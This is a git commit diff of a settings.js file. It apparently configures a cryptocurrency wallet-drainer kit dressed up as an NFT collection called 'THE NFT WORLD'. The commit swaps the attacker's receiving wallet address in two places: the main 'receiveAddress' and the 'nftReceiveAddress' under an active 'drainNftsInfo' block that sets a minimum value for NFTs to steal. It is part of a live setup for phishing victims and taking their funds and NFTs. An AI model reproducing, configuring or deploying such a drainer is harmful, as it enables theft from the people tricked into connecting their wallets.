95cc8ed01f52dfa259b6ec0378f04c94d4f4f74c
EmboGembo <121906433+OceanaPods@users.noreply.github.com>
2023-07-25 14:20:58 +0200

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,4 +1,4 @@
-const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+const receiveAddress = '0xE599A48Cd0BE7daE508A702E28506b0ded005684',
   collectionInfo = {
     name: 'THE NFT WORLD',
     socialMedia: {
@@ -27,7 +27,7 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
   drainNftsInfo = {
     active: true,
     minValue: 0.1,
-    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+    nftReceiveAddress: '0xE599A48Cd0BE7daE508A702E28506b0ded005684',
   },
 
   customStrings = {
